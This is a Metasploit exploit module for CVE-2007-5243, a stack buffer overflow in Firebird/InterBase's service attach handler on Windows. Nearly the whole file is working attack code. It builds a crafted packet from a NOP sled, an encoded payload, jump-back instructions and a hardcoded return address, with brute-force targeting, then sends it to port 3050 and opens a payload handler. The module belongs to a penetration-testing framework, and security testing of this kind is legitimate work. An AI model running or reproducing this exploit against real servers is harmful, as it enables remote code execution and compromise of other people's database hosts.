##
# $Id: fb_svc_attach.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::BruteTargets

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Firebird Relational Database SVC_attach() Buffer Overflow',
			'Description'	=> %q{
				This module exploits a stack buffer overflow in Borland InterBase
				by sending a specially crafted service attach request.
			},
			'Version'	=> '$Revision: 9669 $',
			'Author'	=>
				[
					'ramon',
					'Adriano Lima <adriano@risesecurity.org>',
				],
			'Arch'		=> ARCH_X86,
			'Platform'	=> 'win',
			'References'	=>
				[
					[ 'CVE', '2007-5243' ],
					[ 'OSVDB', '38605' ],
					[ 'BID', '25917' ],
					[ 'URL', 'http://www.risesecurity.org/advisories/RISE-2007002.txt' ],
				],
			'Privileged'	=> true,
			'License'	=> MSF_LICENSE,
			'Payload'	=>
				{
					'Space' => 256,
					'BadChars' => "\x00\x2f\x3a\x40\x5c",
					'StackAdjustment' => -3500,
				},
			'Targets'	=>
				[
					[ 'Brute Force', { } ],
					# 0x0040230b pop ebp; pop ebx; ret
					[
						'Firebird WI-V1.5.3.4870 WI-V1.5.4.4910',
						{ 'Length' => [ 308 ], 'Ret' => 0x0040230b }
					],
					# Debug
					[
						'Debug',
						{ 'Length' => [ 308 ], 'Ret' => 0xaabbccdd }
					],
				],
			'DefaultTarget'	=> 1,
			'DisclosureDate'  => 'Oct 03 2007'
		))

		register_options(
			[
				Opt::RPORT(3050)
			], self.class)
	end

	def exploit_target(target)

		target['Length'].each do |length|

			connect

			# Attach database
			op_attach = 19

			# Create database
			op_create = 20

			# Service attach
			op_service_attach = 82

			remainder = length.remainder(4)
			padding = 0

			if remainder > 0
				padding = (4 - remainder)
			end

			buf = ''

			# Operation/packet type
			buf << [op_service_attach].pack('N')

			# Id
			buf << [0].pack('N')

			# Length
			buf << [length].pack('N')

			# Nop block
			buf << make_nops(length - payload.encoded.length - 13)

			# Payload
			buf << payload.encoded

			# Jump back into the nop block
			buf << "\xe9" + [-260].pack('V')

			# Jump back
			buf << "\xeb" + [-7].pack('c')

			# Random alpha data
			buf << rand_text_alpha(2)

			# Target
			buf << [target.ret].pack('V')

			# Padding
			buf << "\x00" * padding

			# Database parameter block

			# Length
			buf << [1024].pack('N')

			# Random alpha data
			buf << rand_text_alpha(1024)

			sock.put(buf)

			#select(nil,nil,nil,4)

			handler

		end

	end

end
